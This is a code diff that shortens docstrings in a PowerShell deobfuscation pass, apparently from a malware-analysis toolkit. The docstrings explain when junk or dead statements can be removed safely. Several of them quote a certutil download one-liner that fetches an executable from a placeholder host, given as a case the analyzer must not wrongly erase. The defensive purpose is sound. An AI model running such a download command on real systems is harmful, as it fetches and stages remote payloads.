@@ -106,71 +106,37 @@ def _is_injected_noise_bareword(expr: Expression, cache: Ps1ModelCache) -> bool:
 
     This is a guess about an artifact, not a proof about the command. An `=` does not establish that
     the name resolves to nothing, and a native binary invoked this way is still dropped, so the
-    marker is the entire basis for the guess and nothing here may widen past it. The rule this
-    replaced asked instead whether the metadata knew the name, which read absence from a
-    host-collected table as proof of non-existence: every common LOLBin is missing from that table,
-    so `try { certutil -urlcache -split -f http://host/payload.exe } catch { }` erased itself.
+    marker is the entire basis and nothing here may widen past it. Metadata absence cannot be the
+    basis instead: every common LOLBin is missing from the host-collected table, so reading absence
+    as non-existence would erase `try { certutil -urlcache -split -f http://host/p.exe } catch { }`.
 
     The whole guess rests on the command table being the one the metadata describes, so it is only
     made where the name is trustworthy at this very statement:
-    `refinery.lib.scripts.ps1.analysis.worldflow.Ps1WorldReach.may_trust_command_name_at` below.
-    A script that dot-sources a file, imports a module, defines an alias or runs `iex` can make any
-    bareword resolve to real code, and only the redefinitions spelled as a `function` reach the
-    shadow set — the world verdict the name-trust gate reads covers the rest, which is why the
-    precondition sits here rather than in another name-by-name list. Asking it at the position and
-    not over the whole run is what lets the guess reach an obfuscated script at all: a script that
-    rebinds anything anywhere refuses the whole-run question everywhere, and an obfuscated script
-    always rebinds something, so the padding standing above its first opener is precisely the
-    population the whole-run gate could never answer for.
+    `refinery.lib.scripts.ps1.analysis.worldflow.Ps1WorldReach.may_trust_command_name_at` below. A
+    script that dot-sources a file, imports a module, defines an alias or runs `iex` can make any
+    bareword resolve to real code. Asking it at the position and not over the whole run is what lets
+    the guess reach an obfuscated script at all: a script that rebinds anything anywhere refuses the
+    whole-run question everywhere, and an obfuscated script always rebinds something, so the padding
+    standing above its first opener is precisely the population the whole-run gate could never answer
+    for. The known misses this positional guess still makes are pinned in
+    `test.lib.scripts.ps1.deobfuscation.test_removal_observability`.
 
-    Two properties go with that gate, and both fail silently.
-
-    A rebinding anywhere used to refuse everywhere, which made the verdict immune to the script
-    text running twice in one runspace. It is not any more: measured on 5.1, a block that carries
-    such a bareword and rebinds the name at its end emits the handler's word on the first entry and
-    the bareword's own residue on the second, so the second run does what the deletion says nothing
-    does. The script measured is the `& $s; & $s` row in `test.lib.scripts.ps1.corpus`, whose
-    transcript `test.lib.scripts.ps1.test_oracle` takes from a host on every run; it is kept from
-    firing here only by the nesting refusal below — a block is not the root graph, so
-    `refinery.lib.scripts.ps1.analysis.worldflow.Ps1WorldReach._position_in_root` places nothing in
-    it. The forward flood behind the positional query is a per-body one and carries no such edge,
-    and `refinery.lib.scripts.ps1.analysis.worldflow` refuses only the spellings a script names its
-    own path under. Where such a miss costs `refinery.lib.scripts.ps1.analysis.values` and
-    `refinery.lib.scripts.ps1.analysis.effects` a wrongly deleted pure read, here it costs a wrongly
-    deleted command invocation with whatever arguments it carried.
-
-    And the blocks the positional gate newly reaches stand, by construction, above a payload the
-    analysis could not read, so the `Ps1CommandModel.reads_the_error_record` refusal below does not
-    cover them: a payload that reads `$Error.Count` observes the removal, and a scan over text can
-    only find that read where the passes have already folded it into one literal. Measured, the
-    text scan reaches a stored payload and misses one split across two strings or built out of
-    characters, and both of those come out of this pass with `$Error` standing in the output beside
-    the deleted statement that filled it. Those are wrong answers, pinned as such in
-    `test.lib.scripts.ps1.deobfuscation.test_removal_observability`; the guard is worth having for
-    the scripts it does cover, and these are not among them.
-
-    What is then left between a leaking script and a deleted `certutil` is the `=` marker alone,
-    where before there were two things. No native invocation is spelled `<name> =<one token>`, and
-    that is the whole of the defence — which is why `_carries_assignment_marker` is written as
-    narrowly as it is, and why the one shape it cannot tell apart from padding,
-    `try { certutil =http://host/payload.exe } catch { }` above a leak, is carried as a wrong answer
-    beside them rather than left unstated.
+    What is left between a leaking script and a deleted `certutil` is the `=` marker alone. No native
+    invocation is spelled `<name> =<one token>`, and that is the whole of the defence, which is why
+    `_carries_assignment_marker` is written as narrowly as it is.
 
     The name is rejected for a path separator, a program extension and a leading `.` or `~` before
     the trust query rather than after it, because those spellings are not ones that query answers
     about: `refinery.lib.scripts.ps1.ast.normalize_command_name`, which keys the shadow set, strips
     a scope qualifier and not a module one, so a module-qualified spelling is looked up under a key
     no `function` statement ever writes and would be granted on a name the script does redefine.
-    Both orders refuse the same spellings today; only this one refuses them for their own reason.
 
     The drop is also refused wherever the script can read the record the raise leaves behind, which
     is `Ps1CommandModel.reads_the_error_record`. A caught terminating error still fills `$Error`,
     sets `$?` and writes `$StackTrace`, so deleting the statement that raised is visible to a script
     that reads any of the three even though the handler swallowed the error itself. The exposure is
-    not this recognizer's alone — every statement remover in this package shares it, as the gate
-    list in `refinery.lib.scripts.ps1.deobfuscation.aliases` says outright — and the general answer
-    belongs beside removal rather than here. What sits here is the half this guess cannot be made
-    without.
+    not this recognizer's alone — every statement remover in this package shares it — and the general
+    answer belongs beside removal rather than here.
     """
     if not isinstance(expr, Ps1CommandInvocation):
         return False
@@ -207,8 +173,7 @@ def _hoisted_initializer(expr: Expression) -> Ps1ExpressionStatement:
     PowerShell evaluates the initializer in a void context, so its value reaches nobody:
     `for (5; $False; ) { }` and `for ((Get-Date); $False; ) { }` both put nothing on the output,
     where the bare statements `5` and `(Get-Date)` put a value there. Hoisting one plainly would
-    therefore make the deobfuscated script print what the original never printed — the mirror image
-    of deleting output, and no less wrong.
+    therefore make the deobfuscated script print what the original never printed.
 
     An assignment already swallows its own value and is hoisted as written. Everything else is
     wrapped, and the wrapper is `StatementEffect.DISCARD`, so a later pass drops it when the work
@@ -519,18 +484,15 @@ class Ps1DeadCodeElimination(Transformer):
 
         The models travel as the version-keyed cache and are read out of it where they are used,
         never bound at the top and carried across the walk: a prune advances the tree version, and a
-        held world would then answer at its fail-closed pole for every later body of the same pass.
-        A body whose prune bumps the version rebuilds them; a body that changes nothing reads the
-        same cached objects back.
+        held world would then answer `False` for every later body of the same pass. A body whose
+        prune bumps the version rebuilds them; a body that changes nothing reads the same cached
+        objects back.
 
-        This pass used to also drop bare constants wherever it read the body's value as unobserved,
-        which was the narrowest slice of `StatementEffect.OUTPUT` and still a slice of it: `42` at
-        the script root prints `42`, and `if ($x) { 42 }` prints it too. Reading a body's value as
+        Deleting a write to the output stream is not this pass's to make: reading a body's value as
         unobserved is not something position can say — only
         `refinery.lib.scripts.ps1.analysis.effects.Ps1OutputFlow` can, by resolving the destination
-        across the call graph — so deleting a write to the output stream is a decision
-        `refinery.lib.scripts.ps1.deobfuscation.unused.Ps1JunkStatementRemoval` owns alone, and the
-        whole decision is gone from here rather than gated to nothing.
+        across the call graph — so it is a decision
+        `refinery.lib.scripts.ps1.deobfuscation.unused.Ps1JunkStatementRemoval` owns alone.
 
         What is left removes only constructs whose condition is already proved constant, plus
         statements the control-flow graph reports no path can reach — a statement after `return`,
@@ -778,11 +740,11 @@ class Ps1DeadCodeElimination(Transformer):
         a `catch`: it is rarely how the source was written, it is what an earlier pass left behind,
         so it is evidence about that pass and not about whether the original body could throw.
 
-        What an empty `catch` licenses for the dissolution is narrower than it looks, and this used
-        to take it as broad. It licenses *deleting* a statement that raises, since the error was
-        being swallowed either way. It does not license moving one out, and every statement here is
-        moved, not deleted — so the gate is fault-freedom rather than purity, and a body whose
-        statements merely look harmless keeps its construct.
+        What an empty `catch` licenses for the dissolution is narrower than it looks. It licenses
+        *deleting* a statement that raises, since the error was being swallowed either way. It does
+        not license moving one out, and every statement here is moved, not deleted — so the gate is
+        fault-freedom rather than purity, and a body whose statements merely look harmless keeps its
+        construct.
         """
         folded = self._collapse_through_certain_throw(node, cache)
         if folded is not None:
@@ -874,10 +836,7 @@ class Ps1DeadCodeElimination(Transformer):
         Whether anything the trap guards still raises is not asked here at all. It is the question
         `refinery.lib.scripts.ps1.analysis.faults.Ps1FaultReach.removing_a_handler_is_observed`
         answers, and it is asked of every proposal this pass files, over the exceptional edges the
-        graph wired rather than over a search for the `throw` keyword. A gate here used to answer a
-        narrower version of it, and answering one question twice from two different bodies of
-        evidence is how the two come apart: that one counted a `throw` statement anywhere in the
-        graph and so missed
+        graph wired rather than over a search for the `throw` keyword — which would miss
 
             trap { continue }; Get-Item nope -ErrorAction Stop
 
